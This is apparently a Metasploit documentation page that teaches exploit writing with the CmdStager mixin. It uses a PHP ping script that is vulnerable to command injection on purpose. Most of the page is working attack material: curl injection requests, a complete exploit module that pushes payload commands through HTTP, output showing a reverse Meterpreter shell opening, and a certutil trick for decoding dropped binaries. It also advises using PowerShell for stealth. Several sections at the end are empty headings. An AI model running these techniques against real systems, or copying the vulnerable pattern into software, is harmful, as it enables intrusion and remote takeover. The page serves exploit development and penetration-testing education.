Command stagers provide an easy way to write exploits against typical vulnerabilities such as [command execution](https://www.owasp.org/index.php/Command_Injection) or [code injection](https://www.owasp.org/index.php/Code_Injection). There are currently eight different flavors of command stagers, each uses some sort of system command to save your payload onto the target machine, and execute it.

# The Vulnerability Test Case

The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:

```php
<?php
   if ( isset($_GET["ip"]) ) {
      $output = system("ping -c 1 " . $_GET["ip"]);
      die($output);
   }
?>

<html>
<body>
  <form action = "ping.php" method = "GET">
   IP to ping: <input type = "text" name = "ip" /> <input type = "submit" />
  </form>
   </body>
</html>
```

Place the above PHP script (ping.php) on an [Ubuntu + Apache + PHP](https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04) server.

Under normal usage, this is how the script behaves - it just pings the host you specify, and shows
you the output:

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
```

OK, now we can abuse that a little and execute another command (id):

```
$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.


# The Msf::Exploit::CmdStager Mixin

Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:

**1. Include the Msf::Exploit::CmdStager mixin**

Although there are eight flavors of mixins/stagers, you only need to include [Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb) when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers:

```ruby
include Msf::Exploit::CmdStager
```

**2. Declare your flavors**

To tell Msf::Exploit::CmdStager what flavors you want, you can add the ```CmdStagerFlavor``` info in the module's metadata. Either from the common level, or the target level. Or, you can pass this info to the execute_cmdstager
method (see Call #execute_cmdstager to begin)

```ruby
execute_cmdstager(flavor: :vbs)
```

**3. Create the execute_command method**

You also must create a ```def execute_command(cmd, opts = {})``` method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the ```cmd``` variable to the vulnerable code.

**4. Call #execute_cmdstager to begin**

And lastly, in your exploit method, call ```execute_cmdstager``` to begin the command stager.

Over the years, we have also learned that these options are quite handy when calling
execute_cmdstager:

* **flavor** - You can specify what command stager (flavor) to use from here. Options are: ```:bourne```, ```:debug_asm```, ```:debug_write```, ```:echo```, ```:printf```, ```:vbs```, ```:certutil```, ```:tftp```.
* **delay** - How much time to delay between each command execution. 0.25 is default.
* **linemax** - Maximum number of characters per command. 2047 is default.

**Msf::Exploit::CmdStager Template**

At the minimum, this is how your exploit should start when you're using the CmdStager mixin:

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Command Injection Using CmdStager",
      'Description'     => %q{
        This exploits a command injection using the command stager.
      },
      'License'         => MSF_LICENSE,
      'Author'          => [ 'sinn3r' ],
      'References'      => [ [ 'URL', 'http://metasploit.com' ] ],
      'Platform'        => 'linux',
      'Targets'         => [ [ 'Linux', {} ] ],
      'Payload'         => { 'BadChars' => "\x00" },
      'CmdStagerFlavor' => [ 'printf' ],
      'Privileged'      => false,
      'DisclosureDate'  => "Jun 10 2016",
      'DefaultTarget'   => 0))
  end

  def execute_command(cmd, opts = {})
    # calls some method to inject cmd to the vulnerable code.
  end

  def exploit
    print_status("Exploiting...")
    execute_cmdstager
  end

end
```

As you can see, we have chosen the "printf" flavor as our command stager. We will explain more about
this later, but basically what it does is it writes our payload to /tmp and execute it.

Now let's modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:

```
127.0.0.1+%26%26+[Malicious commands]
```

We do that in execute_command using [HttpClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient). Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:

```ruby
def filter_bad_chars(cmd)
  cmd.gsub!(/chmod \+x/, 'chmod 777')
  cmd.gsub!(/;/, ' %26%26 ')
  cmd.gsub!(/ /, '+')
end

def execute_command(cmd, opts = {})
  send_request_cgi({
    'method'        => 'GET',
    'uri'           => '/ping.php',
    'encode_params' => false,
    'vars_get'      => {
      'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
    }
  })
end

def exploit
  print_status("Exploiting...")
  execute_cmdstager
end
```

And let's run that, we should have a shell:


```
msf exploit(cmdstager_demo) > run

[*] Started reverse TCP handler on 10.6.0.92:4444 
[*] Exploiting...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 10.6.0.92
[*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
```

# Flavors

Now that we know how to use the Msf::Exploit::CmdStager mixin, let's take a look at the command
stagers you can use.

## VBS Command Stager

The VBS command stager is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a [VBS script](https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/cmdstager/vbs_b64) using the echo command, then then let the VBS script to decode the Base64 payload, and execute it.

If you are exploiting Windows that supports Powershell, then you might want to [consider using that instead](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit) of the VBS stager, because Powershell tends to be more stealthy.

To use the VBS stager, either specify your CmdStagerFlavor in the metadta:

```ruby
'CmdStagerFlavor' => [ 'vbs' ]
```

Or set the :vbs key to execute_cmdstager:

```ruby
execute_cmdstager(flavor: :vbs)
```

You will also need to make sure the module's supported platforms include windows (also in the metadata), example:

```ruby
'Platform' => 'win'
```


## Certutil Command Stager

Certutil is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. You can also use it to decode the Base64 string from a certificate, and save the decoded content to a file like this:

```bash
echo -----BEGIN CERTIFICATE----- > encoded.txt
echo Just Base64 encode your binary data
echo TVoAAA== >> encoded.txt
echo -----END CERTIFICATE----- >> encoded.txt
certutil -decode encoded.txt decoded.bin
```




## Debug_write Command Stager



## Debug_asm Command Stager




## TFTP Command Stager




## Bourne Command Stager




## Echo Command Stager



## Printf Command Stager

